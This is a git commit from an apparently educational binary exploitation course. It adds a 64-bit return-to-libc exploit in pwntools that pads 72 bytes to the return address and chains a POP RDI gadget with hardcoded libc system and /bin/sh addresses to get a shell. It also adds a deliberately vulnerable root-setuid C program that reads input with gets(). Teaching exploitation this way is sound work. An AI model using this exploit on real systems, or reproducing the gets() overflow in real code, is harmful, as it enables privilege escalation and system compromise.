bac1876d91bdc0b0cdcdbf008d41bff7cdd580b1
Crypto-Cat <jburgess03@qub.ac.uk>
2022-02-16 17:15:19 +0000

    Added 64-bit exploit

---
+++ pwn/binary_exploitation_101/06-return_to_libc/64-bit/exploit.py
@@ -0,0 +1,59 @@
+from pwn import *
+
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+
+# Binary filename
+exe = './secureserver'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'debug'
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+io = start()
+
+# Lib-c offsets, found manually (ASLR_OFF)
+libc_base = 0x7ffff7dde000
+system = libc_base + 0x48e50
+binsh = libc_base + 0x18a152
+
+# POP RDI gadget (found with ropper)
+pop_rdi = 0x40120b
+
+# How many bytes to the instruction pointer (RIP)?
+padding = 72
+
+payload = flat(
+    asm('nop') * padding,  # Padding up to RIP
+    pop_rdi,  # Pop the following address into the RDI register
+    binsh,  # Address of /bin/sh in libc
+    system,  # Address of system function in libc
+)
+
+# Write payload to file
+write('payload', payload)
+
+# Exploit
+io.sendlineafter(b':', payload)
+
+# Get flag/shell
+io.interactive()
---
+++ pwn/binary_exploitation_101/06-return_to_libc/64-bit/secureserver.c
@@ -0,0 +1,19 @@
+#include <stdio.h>
+
+void receive_feedback()
+{
+    char buffer[64];
+
+    puts("Please leave your comments for the server admin but DON'T try to steal our flag.txt:\n");
+    gets(buffer);
+}
+
+int main()
+{
+    setuid(0);
+    setgid(0);
+
+    receive_feedback();
+
+    return 0;
+}
